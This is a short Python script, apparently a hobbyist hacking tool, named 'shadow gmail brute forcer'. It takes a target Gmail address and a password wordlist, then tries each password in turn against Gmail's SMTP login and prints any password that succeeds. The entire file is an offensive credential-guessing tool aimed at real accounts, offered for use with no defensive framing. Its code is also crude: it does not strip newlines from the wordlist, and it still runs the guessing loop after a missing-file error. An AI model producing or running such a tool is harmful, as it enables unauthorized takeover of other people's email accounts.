import smtplib
from colored import fg,attr
color_1 = fg("red")
color_2 = fg("#68f20c")
color_3 = fg('#bded1f')
atrb = attr('reset')
smtp_server = smtplib.SMTP("smtp.gmail.com",587)
smtp_server.ehlo()
smtp_server.starttls()
try:
    print(color_1+"welcome to shadow gmail brute forcer"+atrb)
    user = input("enter your email : ")
    password = input("enter your password file : ")
    password = open(password,'r')

except FileNotFoundError as file_error:
    print("error" + str(file_error))
    print("")

for passwords in password:
    try:
        smtp_server.login(user,passwords)
        print(color_2+"[+] password found !"+atrb , color_3+passwords+atrb)
        print("Success Full !")
        break
    except:
        print(color_1+"\n[-] password incorrect " , passwords+atrb)